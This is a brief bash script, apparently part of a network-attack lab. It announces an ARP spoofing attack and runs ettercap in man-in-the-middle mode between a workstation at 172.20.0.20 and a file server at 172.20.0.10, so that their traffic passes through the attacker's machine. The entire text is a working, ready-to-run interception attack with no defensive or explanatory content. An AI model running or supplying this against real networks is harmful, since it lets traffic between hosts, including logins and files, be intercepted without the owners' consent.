#!/bin/bash
echo "[ATTACK] Starting ARP spoofing..."
echo "[TARGET] Workstation: 172.20.0.20"
echo "[TARGET] File-server: 172.20.0.10" 

ettercap -T -M arp:remote /172.20.0.20// /172.20.0.10//
